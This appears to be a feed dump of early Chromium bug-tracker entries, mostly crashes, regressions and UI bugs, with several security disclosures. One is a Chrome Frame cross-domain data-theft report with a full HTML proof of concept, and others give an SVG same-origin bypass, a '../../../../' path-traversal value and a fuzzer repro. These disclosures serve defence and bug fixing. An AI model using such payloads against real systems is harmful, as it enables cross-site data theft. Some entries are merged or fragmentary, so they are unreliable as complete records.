The changelist to "add mole info to toolstrip definition and enable moles" 
(checked in as r21621)...
   http://codereview.chromium.org/159202
... seems to consistently break the extension specific event changelist 
(r20782), specifically the setup of page action events.

After change r21621, RenderThread::OnPageActionsUpdated is called _after_ the 
js code calls the native function GetCurrentPageActions() and it therefore 
thinks no page actions exist (because the data hasn't been setup yet).

I glanced at the changelist and nothing obvious stuck out, but I'm out of 
time (and on vacation) :) 

Erik, can I ask you to take a look? This may be due to a design flaw in how 
this was implemented to begin with, CC-ing Aaron for comments (in case it 
is).

You should be able to test this with the sample RSS page action:
src\chrome\test\data\extensions\samples\subscribe_page_action

When chromium picked up the DOMAgent change (http://trac.webkit.org/changeset/47231), this test started crashing.

ScriptScope gets called with scriptState=0x00000000 which causes this crash, so it appears that the InspectorController wasn't completely initializated for some 
reason.

Here's the call stack:

type=LogMessageType, WebCore::MessageLevel level=LogMessageLevel, WebCore::ScriptCallStack * callStack=0x002cdcc8)  Line 372 + 0x2f bytes	C++
 	chrome.dll!WebCore::Console::addMessage(WebCore::MessageType type=LogMessageType, WebCore::MessageLevel level=LogMessageLevel, 
WebCore::ScriptCallStack * callStack=0x002cdcc8, bool acceptNoArguments=false)  Line 178	C++

 	chrome.dll!WebCore::ConsoleInternal::logCallback(const v8::Arguments & args={...})  Line 69	C++

How I got this far (in case it is helpful because it took me a bit to figure out these steps):
    I ran the browser_tests project with this option  --gtest_filter=ExtensionBrowserTest.Toolstrip
    When I got the crash dialog, I broke into the browser_test debugging session to keep it from shutting anything down.
    Then, I attached a debugger to both instances of chrome.exe (using the debugger).
    Finally I clicked "debug" in the crash dialog.

title.$t: chrome.tabs.update should not allow navigation to javascript: URLs w/o permission

content.$t:
Now that we have granular permissions in place, we need to be careful about 
APIs that we implement leading to other ways to get the same effective 
privilege.

One such case is javascript: URLs, which are effectively the same privilege 
as content scripts and cross-origin XHR.

chrome.tabs.update() should either not allow javascript: URLs at all, or else 
it should not allow them unless the extension has access to the origin in the 
specified tab.

title.$t: Same Origin Policy Bypass via getSVGDocument() method.

content.$t:
Chrome Version       : Google Chrome	2.0.172.43 (Official Build )
WebKit	530.5
V8	1.1.10.15
User Agent	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) 
AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5
URLs (if applicable) : http://sh0dan.org/svg-test/svg-sopb.html
Other browsers tested:
  Add OK or FAIL after other browsers where you have tested this issue:
     Safari 4:
  Firefox 3.x: OK
         IE 7:
         IE 8:

What steps will reproduce the problem?
1. Load an SVG image in an object tag from a third party site. Set data as 
the uri of the svg file, type as "image/svg+xml"
2. Get a reference to the object and call the getSVGDocument() method.
3. This creates a reference to the objects contentDocument. 
4. From here it is possible to read/set properties of the contentDocument 
of the third party, including cookies.

What is the expected result?
Permission should be denied by same origin policy.

What happens instead?
Ability to read/write cookie data, and view other data from a third party 
sites contentDocument. 

Please provide any additional information below. Attach a screenshot if
possible.
Proof of Concept: http://sh0dan.org/svg-test/svg-sopb.html

Please note the "victim" site (peacecorpwiki) is not under my control, it 
is only used as a demonstration of the issue.
-Isaac

title.$t: Security: window.open('?'); Memory corruption in MSIE with Chrome Frame

content.$t:
It seems Chrome Frame doesn't handle opening a new window using a URL that 
only contain a query:

cf:http://jssh.skypher.com/4.4/Main.html?
command%3Dwindow.open%28%22%3Fx%22%29%3B&execute

This will execute "window.open('?');" causing MSIE to crash when calling a 
COM method, the address of COM methods is normally stored on the heap. The 
crash is not reliable; I expect it's caused by memory corruption, probably a 
race condition between two frames. because of the architecture of MSIE, this 
bug is likely easy to exploit :(

title.$t: Gears DLL is not marked at NX compatible

content.$t:
gears.dll is not marked as NX (no execute) compatible thus the heaps and the 
stacks are marked as no-execute. 

Upon a stack or heap overflow, malicious code can be executed from the stack 
or heap making exploits much simpler.

title.$t: avcodec-52.dll is not marked NX, SafeSEH or DBCompat

content.$t:
avcodec-52.dll is compiled with settings that makes it trivial for exploitation in case of a buffer overflow or other bugs.

1-Not NX compatible: The no-execute flag is not set for heap or stack, so 
malicious code can execute from regular stack.

2-Not using SafeSEH: malicious code can inject fake exceptions frame and 
cause an exception to happen thereby gaining control of execution despite 
stack cannaries (/GS) being present.

3-Not Dynamic Base compatible. In Vista and Win7 the DLL will not 
participate of address space randomization making 'predictable addresses' 
attack feasible.

title.$t: Integer overflows in Skia walk_edges function.
Chrome does not checksum downloaded .bdic files; Leads to crashes, possible exploits.

content.$t:
Chrome does not checksum .bdic files downloaded after installation, 
including over a proxy server.

A proxy server owner can easily provide a corrupt or invalid .bdic file, 
causing Chrome to crash.

I don't know this for sure, but I'm assuming that a specially crafted .bdic 
file can lead to user-level code execution.

See Issue 13424 for details.

I came across this because the Chrome download site is blocked by the proxy 
server at my office, and Chrome saved the proxy server's "access denied" 
page into the .bdic file.

content.$t: What steps will reproduce the problem? 1. Start Chrome. 2. Hit Ctrl-Shift-N to open a new incognito window. 3. Click the wrench menu. 4. The browser crashes. The crash is a null pointer dereference inside of SyncStatusUIHelper::GetLabels because |service| is NULL.

content.$t: Chrome Frame 4.0.223.0 IE 6,7,8 OS: XP, Vista CF 223.0 installing not adding add-on to IE. What steps will reproduce the problem? 1. Run unsigned mini_installer.exe 2. Try to access web pages with CF. 3. Try to find CF in IE add-on list. What is the expected output? Web pages should be rendered in CF. CF should be visible in the IE add-on list. title.$t: Security: MSVR report: Chrome Frame allows x-domain data theft in IE

content.$t:
Microsoft just reported an issue that allows cross-domain code stealing 
exploit using ChromeFrame plugin in Internet Explorer

MSVR Case Identifier: Cross-domain information stealing via Google 
ChromeFrame [MSVR-09-0061]

Finder: Billy Rios and Microsoft Vulnerability Research (MSVR)

Technical Details of the exploit:  
    A specially crafted web page can use ChromeFrame running in IE  to 
steal the script and html content from any arbitrary web site using 
XMLHTTP. This page forces ChromeFrame to load using the cf: protocol 
handler, pointing ChromeFrame to the view-source: protocol handler, and 
then finally points the view-source: protocol  handler to a JavaScript URI. 
This permits the attacker to run arbitrary JavaScript without domain 
restrictions, including access to the network stack and arbitrary web pages 
(though not the local filesystem). while the PoC supplied is directed at 
extracting content from Google.com, the exploit could be used for one site 
(badguy.com) to attack another (trusted-bank.com).


PoC Code:
<html>
<title>
Cross Domain Bug in Chrome Frame
</title>
<body>
<h1>
Cross Domain Bug in Chrome Frame
</h1>
This Page pulls content from Google.com using XMLHTTP
<iframe src="cf:view-source:javascript:req = new 
XMLHttpRequest();req.onreadystatechange = function(){if(req.readyState == 
4){if(req.status == 
200){alert(req.responseText);}else{alert(req.status);}}};req.open('GET', 
'http://www.google.com', true);req.send(null);"> </iframe>
</body>
</html>

Change the url, if trying from google.com domain.

title.$t: Security: Chromium bug for gears fts2 security vulnerability

content.$t:
An evil Gears-authorized site can deliberate corrupt its own fts2 metadata 
and cause crashes, possibly memory corruption.

Using SecSeverity-High because there is additional user intervention beyond 
visiting an attacker-controlled URL: the victim has to explicitly check "I 
trust this site" and then hit OK to enable Gears for evil.com

title.$t: Security Broken in Gmail and Blogger Comment Windows.

content.$t:
Hi with version 4.0.223.11 and 4.0.223.16, secure pages are broken.  The 
secure icon changes from the padlock to the triangle with the exclamation 
mark saying "This page contains some insecure content.".  So far I have 
found that this problem happens when I am in the comment window of 
"http://googlechromereleases.blogspot.com/" and also in gmail.  For gmail I 
found that the source of the problem has something to do with the "Google 
Talk Plugin" because when I sign into Gmail and and GTalk finally loads, 
the security of the page breaks.  When I use "disable-plugins" in the 
short-cut, Gmail remains secure after Gtalk is fully loaded.  But even when 
the plugins are disabled, this comment window's security is still broken.  
Why?  Anyway, there should be a feature that would allow the user to choose 
what plugins they want to disable, instead of having one choice to either 
have all of them enable or none at all.  Anyway, it would be nice if this 
security problem would get fixed.

title.$t: Security: Bad reference counting in WTF:: PassRefPtr leads to use after free

content.$t:
Chris can you have a good look at this and let me know if I am mistaken;
this seems to be a trivial bug with far reaching consequences.

Here's the offending code from WebKit/JavaScriptCore/wtf/PassRefPtr.h:

    template <typename T, typename U> inline PassRefPtr<T> static_pointer_cast(const PassRefPtr<U>& p)
    {
        return adoptRef(static_cast<T*>(p.releaseRef()));
    }

    template <typename T, typename U> inline PassRefPtr<T> const_pointer_cast(const PassRefPtr<U>& p)
    {
        return adoptRef(const_cast<T*>(p.releaseRef()));
    }

If I understand correctly, this code will release the reference first
and then add a reference back, which is the wrong way around; this could
lead to the object having 0 references while transferring ownership,
leading to the object being destroyed/freed. The object could then
continue to be used. If this is the case, we should scan the code base
for similar mistakes and warn WebKit devs not to write code like this ever
again.

However, this seems too easy - either I am missing something, or this has
gone undetected for a long time. While investigating a hard-to-reproduce
issue, a bit of code-analysis of functions on the stack lead me to these
two functions, which could explain the problem. I have also seen similar
stacks in previous crashes, but I wrote them off as freak accidents caused
by cosmic gamma rays or something like that as they never seem to reproduce.
Here's the call stack of the issue that lead me to this:

WTF::HashTable<WebCore::String,WebCore::String,WTF::IdentityExtractor<WebCore::String>,WebCore::StringHash,WTF::HashTraits<WebCore::String>,WTF::HashTraits<WebCore::String> >::add<WebCore::String,WebCore::String,WTF::IdentityHashTranslator<WebCore::String,WebCore::String,WebCore::StringHash> >(class WebCore::String * key = 0x0030ec14, class WebCore::String * extra = 0x0030ec14)+0x43
WebCore::InspectorController::addResource(class WebCore::InspectorResource * resource = 0x00000000)+0xb6
WebCore::InspectorController::identifierForInitialRequest(unsigned long identifier = 0x75b2000, class WebCore::DocumentLoader * loader = 0x06d09800, class WebCore::ResourceRequest * request = 0x06d09858)+0xa4
WebCore::ResourceLoadNotifier::assignIdentifierToInitialRequest(unsigned long identifier = 2, class WebCore::DocumentLoader * loader = 0x06d09800, class WebCore::ResourceRequest * request = 0x06d09858)+0x3e
WebCore::FrameLoader::continueLoadAfterWillSubmitForm(void)+0x79
WebCore::FrameLoader::continueLoadAfterNavigationPolicy(class WebCore::ResourceRequest * __formal = 0x06d09af8, class WTF::PassRefPtr<WebCore::FormState> formState = class WTF::PassRefPtr<WebCore::FormState>, bool shouldContinue = true)+0x276
WebCore::FrameLoader::callContinueLoadAfterNavigationPolicy(void * argument = 0x030d10a8, class WebCore::ResourceRequest * request = 0x06d09af8, class WTF::PassRefPtr<WebCore::FormState> formState = class WTF::PassRefPtr<WebCore::FormState>, bool shouldContinue = true)+0x1b
WebCore::PolicyChecker::checkNavigationPolicy(class WebCore::ResourceRequest * request = 0x06d09af8, class WebCore::DocumentLoader * loader = 0x06d09800, class WTF::PassRefPtr<WebCore::FormState> formState = class WTF::PassRefPtr<WebCore::FormState>, <function> * function = 0x693dfcd0, void * argument = 0x030d10a8)+0x215
WebCore::FrameLoader::loadWithDocumentLoader(class WebCore::DocumentLoader * loader = 0x06d09800, WebCore::FrameLoadType type = 51187888 (No matching enumerant), class WTF::PassRefPtr<WebCore::FormState> prpFormState = class WTF::PassRefPtr<WebCore::FormState>)+0x24c
WebCore::FrameLoader::loadWithNavigationAction(class WebCore::ResourceRequest * request = 0x0030ef38, class WebCore::NavigationAction * action = 0x0030f030, bool lockHistory = false, WebCore::FrameLoadType type = FrameLoadTypeStandard (0), class WTF::PassRefPtr<WebCore::FormState> formState = class WTF::PassRefPtr<WebCore::FormState>)+0x173
WebCore::FrameLoader::loadURL(class WebCore::KURL * newURL = 0x0030f150, class WebCore::String * referrer = 0x0030f120, class WebCore::String * frameName = 0x0030f248, bool lockHistory = false, WebCore::FrameLoadType newLoadType = FrameLoadTypeStandard (0), class WTF::PassRefPtr<WebCore::Event> event = class WTF::PassRefPtr<WebCore::Event>, class WTF::PassRefPtr<WebCore::FormState> prpFormState = class WTF::PassRefPtr<WebCore::FormState>)+0x393
WebCore::FrameLoader::loadFrameRequest(struct WebCore::FrameLoadRequest * request = 0x0030f150, bool lockHistory = false, bool lockBackForwardList = false, class WTF::PassRefPtr<WebCore::Event> event = class WTF::PassRefPtr<WebCore::Event>, class WTF::PassRefPtr<WebCore::FormState> formState = class WTF::PassRefPtr<WebCore::FormState>, WebCore::ReferrerPolicy referrerPolicy = SendReferrer (0))+0x2ca

The above call stack was triggered by JavaScript that essentially does
"history.go(0);". However, simply executing this script doesn't reproduce
the issue. I have been unable to reproduce the problem outside of my
framework, so there must be some kind of timing requirement that I cannot
reproduce. Inside the framework, it is reported to trigger 33% of the time,
which seems to be easy enough to trigger!?

title.$t: Security: potential file:/// access via cf handler

content.$t:
We got a private report from a security researcher indicating it's possible
to transition to file:/// via Chrome cf protocol handler. (His report below)

Sumit identified one problem in
http://src.chromium.org/viewvc/chrome/branches/223/src/chrome_frame/utils.cc?view=markup&pathrev=30462,
which does no additional checking for about locations, also noting that
Chrome code defines about scheme as "about" and not "about:" Is this
intended? See: static const char kAboutScheme[] = "about"; in
http://src.chromium.org/viewvc/chrome/trunk/src/chrome/browser/browser_about_handler.cc?view=markup&pathrev=8764

===========================================================================
Hi David :

some more to test

crashing the tab

get the file

title.$t: Are you aware of the XBox 360 security system?

content.$t:
You write that a computer can't be 100% secure, so I was wondering if you
are aware of how the XBox 360 security works?

The Xbox 360 Security System and its Weaknesses
http://www.youtube.com/watch?v=uxjpmc8ZIxM

right, which MS almost did.

tmbinc[]at[]elitedvb[]dot[]net

title.$t: Gmail https broken

content.$t:
Bug occurs in all the dev versions since 223.11.

-Go to gmail.com
-log in

if you enabled https the URL bar should now turn yellow and show a padlock as 
a sign of secure transmissions. Instead it turns yellow for just a second, and 
then switches to white, still saying https, although no padlock but the orange 
triangle stating that there is insecure content on the site.

Tested on latest Opera, Firefox, IE, Safari - all OK
Tested on 222.12 - OK
Tested on all dev versions since 223.11 - BROKEN

There are already filed two issues (however reported as a "normal" bug, not 
security bug)

Issue 27813
Issue 27011

title.$t: HTTPS pages contain warning about not being secure.

content.$t: (Describe security bug here, with as much details and steps to reproduce as possible. Security bugs are visible only to the reporter and to project members.) For some reason, which I can't determine your browser considers the following page ( and all others on my site) not secure: https://www.bicyclebuys.com/ssl.htm The warning triangle displays with the message: Connect: However, this page includes other resources which are not secure. These resources can be viewed by others whil in transit, and an be modified by an attacker to change the look or behavior of the page. Do you have a developer version that elaborates on this?

title.$t: Security: What about support for the Green Address Bar? (SSL EV...)

content.$t:
That latest standards of SSL has a feature called 'Green Bar', or SSL EV 
(Extended Validation).

The point is that certificates with the EV feature, will cause the browser 
to turn the address bar to green color.
As opposed to 'normal' certificates which will make the address bar yellow,
and blacklisted certificates which will turn it red.

This is already supported by IE8, and Firefox 3,
And this is really important to implement in chrome.

If I log in to my bank account, I NEED to see the green address bar up 
there!

And another note: Chrome supports extensions which can modify the address 
bar... We need to make sure that there will be absolutely no way for a 
website to use javascript to turn the addressbar green...

title.$t: Bloat HTTP page cycler regression (11%)

content.$t:
Bloat HTTP page cycler regression (11%)

It looks like http://src.chromium.org/viewvc/chrome?view=rev&revision=33861 
is to blame and http://src.chromium.org/viewvc/chrome?view=rev&revision=33880 
didn't help with this test :(

title.$t: Bug

content.$t: This bug scared me a lot!

title.$t: Chrome autoruns executables without asking permission

content.$t:
Chrome can run an executalbe from a site without asking permission to do 
that. Example: http://www.google.com/chrome/. Chrome will download and launch 
ChromeSetup.exe right after clicking on "Accept" button.

title.$t: After clicking "Deny" to a dialog that appeared when a website attempted to cause multiple file downloads, a file was still automatically downloaded

content.$t:
Upon visiting encyclopediadramatica.com, a dialog appeared that stated that 
the website was attempting to download files to my computer, and if I wanted 
to allow it (don't remember exactly what was said). Two seconds after I 
clicked "Deny", a file with a PDF extension was automatically saved to my 
downloads folder. It isn't a valid PDF file, but Kaspersky's online virus 
scanner says it's clean (http://www.kaspersky.com/scanforvirus) I've decided 
to attach it to the bug report, in case it helps reproduce the issue.

This is probably nothing, but I wanted to double check that the developers 
know about this.

I'm using Google Chrome 4.0.249.30 for Linux.

title.$t: Security: sandbox bypass due to directory traversal opening Web Database files

content.$t:
If a compromised renderer sends a "sqlite_suffix" containing 
../../../../some/file, it gets appended to the filename to open verbatim.

Simple patch to follow.

title.$t: "Show password" button a huge security hole

content.$t:
If a laptop is stolen, there isn't much that can be done about sites with 
passwords that are saved.  However, the fact that the user can click the 
"Show password" button could give the thief knowledge about what the 
passwords are.  They can see if the same password is being used for multiple 
sites, tendencies, etc possibly allowing them to guess the user's passwords 
on other sites.

title.$t: Extensions do not specify platform for NPAPI plugin libraries

content.$t:
See
http://groups.google.com/group/chromium-dev/browse_thread/thread/45c7682e688213c2
for details, but briefly:

http://code.google.com/chrome/extensions/npapi.html specifies that NPAPI
plugin libraries are just listed. No platforms.

This causes a multitude of major issues. We need to rev the spec and do it
now before a million one-platform extensions are out there.

title.$t: Web Workers abuse - opt in required?

content.$t:
With web workers coming to Chrome and Firefox, I think a discussion needs
to be raised to look at the possible abuse of these features by cloud-like
functionality.

Example: http://github.com/revis/Really-Cloudy
Description: 	A web worker library to distribute work packages to your
website visitors. edit
Homepage: 	http://theplanis.com/clouds/ 

If web workers can be used in a SETI@home-kind of way without users
permissions, it spells disaster.

Thoughts? Do we need opt-in? Is there real case for abuse?

title.$t: Security SafeBrowsingService pure virtual function call and memory corruption

content.$t:
Pure virtual function call details:
Id: 'SafeBrowsingService::OnBlockingPageDone R6025 DebugBreak (d6c6e6b6429cb8f7d16625091f70beac)'
Description: 'Pure virtual function call in SafeBrowsingService::OnBlockingPageDone'
Relevant stack:
  chrome_67b80000!`anonymous namespace'::InvalidParameter(
    wchar_t * expression = 0x67c21b23 "????",
    wchar_t * function = 0x00000000 "",
    wchar_t * file = 0x04cefd74 "?????",
    unsigned int line = 0x3fd3360,
    unsigned int reserved = 0
    )+0x3 [c:\b\slave\chromium-rel-xp\build\src\chrome\app\chrome_dll_main.cc @ 136]
  chrome_67b80000!_purecall(void)+0x12 [f:\dd\vctools\crt_bld\self_x86\crt\src\purevirt.c @ 54]
  chrome_67b80000!SafeBrowsingService::OnBlockingPageDone(
    class std::vector<SafeBrowsingService::UnsafeResource,std::allocator<SafeBrowsingService::UnsafeResource> > * resources = 0x07e9b24c,
    bool proceed = false
    )+0x53 [c:\b\slave\chromium-rel-xp\build\src\chrome\browser\safe_browsing\safe_browsing_service.cc @ 238]


Memory corruption details:
Id: 'SafeBrowsingService::OnBlockingPageDone ReadAV@Arbitrary (d6c6e6b6429cb8f7d16625091f70beac)'
Description: 'Attempt to read from arbitrary memory @ 0x30303228 in SafeBrowsingService::OnBlockingPageDone'
Relevant stack:
  chrome_67b80000!SafeBrowsingService::OnBlockingPageDone(
    class std::vector<SafeBrowsingService::UnsafeResource,std::allocator<SafeBrowsingService::UnsafeResource> > * resources = 0x0606c30c,
    bool proceed = false
    )+0x4d [c:\b\slave\chromium-rel-xp\build\src\chrome\browser\safe_browsing\safe_browsing_service.cc @ 236]
  chrome_67b80000!RunnableMethod<SafeBrowsingService,void (void)+0x1a [c:\b\slave\chromium-rel-xp\build\src\base\task.h @ 289]

Repro steps:
1) Try to open a website that has been marked as hosting malware and no longer exists (eg. http://318x.com/).
2) You see an interstitial; click the checkbox and "Proceed anyway".
3) Chrome is trying to connect, which takes a long time because the site is offline.
4) While Chrome is still trying to connect, refresh the page. Optionally go through steps 2-4 again if the crash doesn't happen immediately.

Marking as security because of the memory corruption. Severity initially set to medium because this requires unlikely user interaction to exploit.

title.$t: Extension pop-up page is loaded into main window

content.$t:
Chrome Version       : 4.0.249.30

What steps will reproduce the problem?
1. Install extension:
Google Tasks - Version: 0.4
Access Google Tasks directly from within Chrome.
ID: cfalmamgbiaipibeangdiekjodjjmndm

2. open an image i.e.
http://deadendweb.com/wp-content/uploads/2009/03/cat-carrier.jpg

What is the expected result?
The image is shown in current tab.


What happens instead?
The image is shown with the extension pop-up loaded into the page!!!

If I disable the extension and reload the (image)page, everything is fine 
again.

This bug could have serious implications... I think it's kind of a security 
bug

title.$t: window.open() Method Javascript Same-Origin Policy Violation
Temp dir/file leak during test_shell_tests and layout_tests

content.$t:
While running the test_shell_tests and layout_tests on linux, there are a lot of directories created in the /tmp dir 
that are not deleted.

There are so many that after ~1 week we need to delete them manually otherwise the tests start failing.

TestIt is one of those tests. I assume it is also one that is leaking, but haven't verified.

example:
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 08:59 org.chromium.Nb7lDM
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 08:57 org.chromium.NIKafv
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 08:59 org.chromium.NJK3SR
-rw------- 1 chrome-bot chrome-bot 12480 2010-01-15 08:57 org.chromium.OI0aCr
-rw------- 1 chrome-bot chrome-bot 12480 2010-01-15 08:57 org.chromium.oSUC4n
-rw------- 1 chrome-bot chrome-bot 12480 2010-01-15 09:00 org.chromium.oTqU9j
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 08:54 org.chromium.OXibzc
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 08:59 org.chromium.p6WtqQ
drwx------ 2 chrome-bot chrome-bot  4096 2010-01-15 09:00 org.chromium.p7oK2w


# ls -R org.chromium.rhmsWQ
org.chromium.rhmsWQ:
databases

org.chromium.rhmsWQ/databases:
Databases.db  file__0

org.chromium.rhmsWQ/databases/file__0:
1


--------------

There are also some files leaked. always the same size, 12480 bytes. with binary content.
Looking at the strings in this file I can find "Produced by Todd Fahrner for the CSS Samurai's browser testing"
looks like acid3 stuff. 

The file leak might me newer than the directory leak. I don't recall seeing it when I first look a month or 2 ago.

title.$t: Security: WebKit Bug 33802 - WebCore::RenderMenuList::setText ExecAV@Arbitrary (fe810d95ab2c1eef13e951397ed944ce)

content.$t:
Repro:
1) Go to http://www.nshispeed.nl/
2) If you see a popup in the middle of the screen with the word "Blauw", 
click "Nee" to get rid of it.
2) Click "English" at the top of the page (not required, but makes it 
easier to explain how to repro).
3) In the middle of the page there should be a purple box with two input boxes. Select either one and type "Parijs".
4) Click on the magnifying glass icon next to the input box.
5) A new popup should show up with two pull-down selection boxes. Choose 
"Frankrijk" in the top one and "Paris Nord" in the bottom one.
6) Click "bevestig" -> KABOOM.

This may not make it into v4, but I wanted to draw attention to the problem 
asap.

content.$t:
I have stumbled upon an odd out-of-bounds read in XML parsing of an SVG 
file that I cannot reproduce. I can also not understand what is going on 
that could cause the issue.

The repro file (after a bit of reduction) looks like this:
'<[&\\}\xe2\xed\xa5\xe0\xf8\xcdxu?xml 
versio\x06\'Md\x927i\xb0T\x1e\xb1\xf2M\x05\x8a"\x7f\xa1\x8c\x0en="1.0" 
enaoding="UTF-8"?>\n<!--===vg>\n'

Attached are all the details my framework grabbed when it found this, 
hopefully somebody with a bit of experience in XML code can find out what 
is going on.

(Q: What Area label should this be given)
(Q: Does the browser use libxml? If so, this could be SecSeverity-Critical)

title.$t: Non-ASCII character display garble text in saved autofill data after browser relaunch

content.$t: Chrome: 5.0.353.0 (正式版本 41538) OS: Win Vista What steps will reproduce the problem? 1.launch Chrome 2.go to wrench menu > options > personal stuff > change autofill settings 3.click add an address 4. enter non-ASCII text in address, name fields, (e.g. use "测试") 5. save the settings and exist 6. close chrome 7. launch chrome again 8. go to autofill settings again What is the expected output? What do you see instead? the Chinese name and address data should display properly. instead all the non-ASCII string became garble text. Please use labels and text to provide additional information.

content.$t: Platform: Hostname: 0016cba57fe9.local Mac OS X Version 10.5.8 (Build 9L30) Processor: 1 Intel 1.50 GHz RAM: 1024 MB Chromium: Chromium version: 5.0.358.0 SVN Revision: 41970 <<<Release>>> QuickTime Player: 7.6.4 QuickTime PlayerX: <unknown> Flash Player: 10.0.42 What steps will reproduce the problem? 1. Clean install chrome 2. Add multiple address to the Autofill from preferences. 2. Open Gmail > create an account. 3. Provide valid record different from once used in step 2 autofill , Submit . 4. In the info bar click on " Set up AutoFill ..." What is the expected output? If the autofill records are present, and the user clicks on Set up AutoFill , should append to existing once . title.$t: Security: Selecting a address label in an address form field ALSO fills the default credit card

content.$t:
Note that this bug is different from
http://code.google.com/p/chromium/issues/detail?id=41265

Chrome for Windows Vista 5.0.376.0 (44209)
Steps to reproduce:
1. Create two address labels. make the first one default and fill all entries.
2. in second address label, just put in city as redwood city.
3. create a credit card label. make it default. fill in all entries.
4. go to http://infernohacks.com/t/autofill/cc.html
5. go to city field, press down arrow and select "redwood city (label name)"
6. you will see default credit card entries filled in as well.

this is a security vulnerability. user would never expect his/her credit
info filled in from selecting an address label. the only usecase possible
looks to come from select a label in name field which can fill in default
credit card (although more info need to be provided which i am working in
mockup for bug http://code.google.com/p/chromium/issues/detail?id=38890).

title.$t: Some security related tests changed after http://trac.webkit.org/changeset/57535/

title.$t: Security: WebKit 43297 - cross_fuzz "plugins" window reload memory corruption
Need process singleton implementation

content.$t:
ProcessSingleton is responsible for keeping one Chromium instance running 
at a time.  (This is necessary because the various data files we use do not 
support concurrent modifications.)

There's a stub implementation for Linux, but currently it just aborts if 
you're already running another instance of Chromium, rather than sending a 
message to the already-running process telling it to bring up another 
window.

See process_singleton_linux.cc.

title.$t: Interstitial SSL pages on Linux don't work

content.$t:
A starter project for Markus.

(This affects Mac a bit too; once he checks in the shared bits, we can 
remove the OS-Mac tag.)

title.$t: Fix focus problems / omnibox focus with Linux.

content.$t:
Our Focus should match Windows.  Here are some things we get wrong:

- On a navigation, we should put focus to the web contents, now it stays on 
the URL bar.

- We have some painting problems, we still paint a focus ring in the web 
contents, even when the focus is in the URL bar.

- When we start, focus is in the URL bar even though a page is loaded.  
This is probably the same as the first issue.

- Tab order is strange, you would expect to be able to tab from the omnibox 
into the web contents, and then back with shift-tab.  However, when you tab 
from the omnibox into the web contents, you aren't in the first element of 
the web contents.  I think this maybe matches Windows though.

FC11 is GCC 4.4 based and it looks like we might have issues.

Assigning to Tony since he was going to install an FC11 test machine.

title.$t: [regression] test_shell spins when showing windowed plugins

content.$t:
Load a page with a windowed plugin.  test_shell goes into a paint storm, 
continuously repainting the whole page.  I've been unable to track down where 
it regressed, so here are some notes.

 - using DiamondX (which doesn't animate / redraw repeatedly), still happens
 - turning off the call to PaintRect in webwidget_host_gtk.cc (which calls 
into WebKit to paint) fixes it!  but at at the cost of disabling webkit 
painting, so that call is somehow triggering it

title.$t: Font fallback should eventually fall back on fontconfig

content.$t:
WebKit generally manages font fallback (consider CSS rules), so when it 
requests a font by name we should not allow fontconfig to do font fallback.

However, if it finds no matches at all, we ought to allow fontconfig to do 
its best effort at matching.  This is conceptually simple but the APIs 
involved (webkit, skia, etc.) make it difficult.

agl suggested in bug 9100 that FontCache::getLastResortFallbackFont() could 
pass a magic font name so that skia could know to do this behavior.  This bug 
is a tightening of bug 9100.

I have a patch (contributed by Dan Erat) for this.

title.$t: Override font sizes for UI elements where size matters

content.$t:
We can't require a particular font on Linux for UI elements (since we can't 
know what fonts the user has installed, and we should obey the user's wishes 
anyway).  But for the omnibox and tab titles, only fonts of a certain size 
will fit.  We should override the font size for the omnibox and tab titles.

[linus brought this bug up]

title.$t: Upgrading to Ubuntu 9.04 disables the Google repository, preventing autoupdates

content.$t:
The Ubuntu 9.04 upgrade procedure comments out the
Google repository.  We need to sense this and re-enable it.
We're talking with Canonical about the recommended way to do this.

title.$t: Linux: OwnedWidgetGtk::Destroy debug crash

content.$t: What steps will reproduce the problem? 1. Navigate somewhere that takes a long time to finish loading. An interstitial page sometimes does this. 2. Go to the omnibox and go to some location. This causes the pending RVH to shutdown. Note that this happens within a gtk signal for a keypress. The widget associated with this will be the pending RVH's view's widget. gtkmain will g_object_ref() this widget. When the RVHWGtk shuts down, it will call OwnedWidgetGtk::Destroy() to destroy the widget. This calls gtk_widget_destroy() which detaches the widget from all containers holding a reference to it, but it doesn't compensate for the key press signal handler holding a reference to it. OwnedWidgetGtk::Destroy() will DCHECK that there is only one reference count for the widget, which fails, so it crashes. title.$t: Linux: glipper / klipper fight with inline autocomplete

content.$t: Chrome Version : <include svn revno; e.g. dpkg -s chromium-browser> OS + version : Ubuntu 8.04 window manager : KDE 3 URLs (if applicable) : Any that have been remembered / visited before. Behavior in Firefox 3.x (if applicable): As expected. What steps will reproduce the problem? 1. Go to a never-before visited site (say: dnews.de). 2. Close tab. 3. Open new tab, start typing "dnews.de" in the URL bar. What is the expected result? As the browser remembers my URL, and I keep typing, it should _overwrite_ the URL. What happens instead? As you type, "dnews.de" is pasted into the URL bar, and the remainder of "dnews.de" that you typed is _inserted_ into the URL, rather than written over the url. So, you might end up with "http://dnews.deews.de/" in the URL bar (depending on at what time the browser decided to paste the remembered URL in there). This happens in ~50% of the cases. Niek Bergboer

title.$t: File chooser crashes on 64-bit Linux

content.$t:
While trying to reproduce http://crbug.com/11888,
I get hangs and valgrind errors with *any* input box.  
e.g. create upload.html containing just one  input type="file" field:

<html>
<body>
<input type="file">
</body>
</html>

On my 32 bit hardy (well, ghardy) laptop, this brings up the
file chooser, but the file chooser isn't really useful, as
it doesn't show any files at all.  Same behavior under valgrind.
(But see http://crbug.com/12184 for a probably unrelated valgrind warning
that comes up.)

On my 64 bit ghardy workstation, this seems to work ok, but when
I do it under valgrind a la
  sh tools/valgrind/valgrind.sh ./sconsbuild/Debug/chrome upload.html
I get a warning
